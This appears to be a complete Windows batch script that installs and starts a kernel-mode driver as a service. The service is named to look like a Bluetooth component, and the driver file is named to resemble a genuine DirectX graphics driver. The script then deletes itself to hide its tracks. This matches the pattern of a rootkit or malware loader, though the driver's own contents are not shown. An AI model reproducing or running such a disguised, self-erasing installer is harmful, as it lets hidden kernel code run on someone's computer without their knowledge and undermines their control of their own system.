@echo off
cd %~dp0
sc create BluetoothUserService75 binpath=C:\Windows\System32\drivers\dxgmms3.sys type=kernel
sc start BluetoothUserService75
del "%~f0"